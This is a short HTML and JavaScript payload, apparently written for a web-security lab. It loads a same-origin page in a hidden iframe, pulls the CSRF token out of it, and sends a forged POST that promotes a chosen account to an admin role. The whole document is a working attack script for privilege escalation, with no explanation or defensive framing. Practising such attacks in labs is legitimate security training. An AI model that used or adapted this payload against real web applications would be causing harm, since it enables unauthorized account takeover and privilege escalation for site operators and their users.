<iframe id="levelup" src="/csrfToken/update_role.jsp" style="width:100px;height:100px;border:0;"></iframe>
<script>
(async () => {
  const iframe = document.getElementById("levelup");
  await new Promise((resolve) => iframe.addEventListener("load", resolve, { once: true }));
  const doc = iframe.contentDocument;
  if (!doc) return;
  const token = doc.getElementsByName("csrfToken")[0]; 
  console.log(token.value);
  const params = new URLSearchParams({target_id: "nada661@nada.com",new_role: "ADMIN_csrfToken",csrfToken: token.value,});
  const resp = await fetch("/csrfToken/update_role_ok_csrfToken.jsp", {
    method: "POST", 
    credentials: "same-origin",
    headers: {"Content-Type": "application/x-www-form-urlencoded"}, 
    body: params.toString()});
    console.log(resp);
    console.log(resp.text());
    })();
</script>